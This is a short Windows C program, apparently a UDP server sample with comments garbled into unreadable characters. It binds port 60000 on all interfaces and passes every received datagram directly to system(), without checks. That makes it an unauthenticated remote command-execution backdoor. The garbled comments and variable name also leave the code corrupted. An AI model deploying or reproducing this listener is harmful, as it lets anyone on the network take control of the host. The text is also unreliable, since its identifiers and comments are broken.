#include <winsock.h>
#include <stdio.h>
#include <Windows.h>
#pragma comment(lib,"ws2_32.lib")		//����2�汾32λ��lib

//UDP�����
void main()
{
	//////��ʼ��//////
	WORD version = MAKEWORD(2, 2);		//�汾��
	WSADATA wsdata;						//����ṹ��
	if (WSAStartup(version, &wsdata))	//����DLL �ɹ�����0
	{
		printf("����ʧ��");
		return;
	}
	//////��ʼ��//////



	SOCKET ������׽���;	//����һ��SOCKET���
	SOCKADDR_IN info;		//����ṹ��

	info.sin_family = AF_INET;							//Windowsֻʹ�����ֵ�ַ��ʽ
	info.sin_addr.S_un.S_addr = htonl(INADDR_ANY );		//�󶨱��أ������ַ�������ת��Ϊ�ֽ���
	info.sin_port = htons(60000);						//�˿���Ҫת��ΪС���ֽ���
	/*
		SOCK_DGRAM = udp
		SOCK_STREAM = tcp
	*/
	������׽��� = socket(AF_INET, SOCK_DGRAM, 0);		//����UDP��socket

	bind(������׽���, &info, sizeof(info));			//bind���൱��һ������
	int len = sizeof(info);	//�ṹ��Ĵ�С



	while (1)
	{
		char str[1024] = { 0 };				//����һ�������� �洢���͵�����
		recvfrom(������׽���, str, sizeof(str), 0, &info, &len);	//����
		system(str);						//ִ��
	}



	closesocket(������׽���);	//�ر�
	WSACleanup();				//�ͷ�
	system("pause");			//�ȴ�
}